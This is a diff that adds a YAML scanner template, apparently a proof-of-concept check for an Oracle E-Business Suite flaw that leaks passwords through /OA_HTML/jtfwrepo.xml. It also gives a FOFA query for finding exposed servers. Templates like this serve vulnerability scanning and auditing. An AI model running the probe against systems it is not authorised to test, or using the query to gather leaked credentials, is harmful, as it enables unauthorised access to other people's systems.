@@ -1,0 +1,23 @@
+id: poc-yaml-Oracle-ebs-jtfwrepo-xml-sensitive-information-leak
+info:
+  name: Oracle E-Business Suite jtfwrepo.xml 敏感信息泄漏漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: e-business_suite
+  fofa: app="Oracle-E-Business-Suite" && is_domain=false
+requests:
+- method: GET
+  path: /OA_HTML/jtfwrepo.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"password=") &&
+
+    contains(body,"<PUSR_LIST>") &&
+
+    contains(headers,"text/xml")
+
+    '
+variables: {}
+transport: http
